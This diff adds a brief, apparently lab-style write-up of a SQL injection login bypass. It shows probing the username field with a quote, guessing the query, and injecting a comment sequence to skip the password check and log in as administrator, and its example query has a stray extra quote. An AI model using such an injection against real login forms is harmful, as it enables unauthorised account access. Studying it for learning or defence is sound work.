@@ -1,0 +1,11 @@
+Concept: Perform Sqli attack bypass the login function
+GOAL: Login as an administrator account
+
+First, let start with put a sql syntax like ' to test the username input -> Result: internal error on the server side
+After I know it vulnerable to sqli then I assume the query to login look like this:
+    Select firstname from user where username = 'administrator' and password = 'administrator'
+then I try to change the query to access administrator account:
+    Select firstname from user where username = 'administrator''-- and password = 'administrator'
+I put '-- to comment out the last part to turn the query to:
+    Select firstname from user where username = 'administrator''-- --> Result: I successfully access to administrator
+account
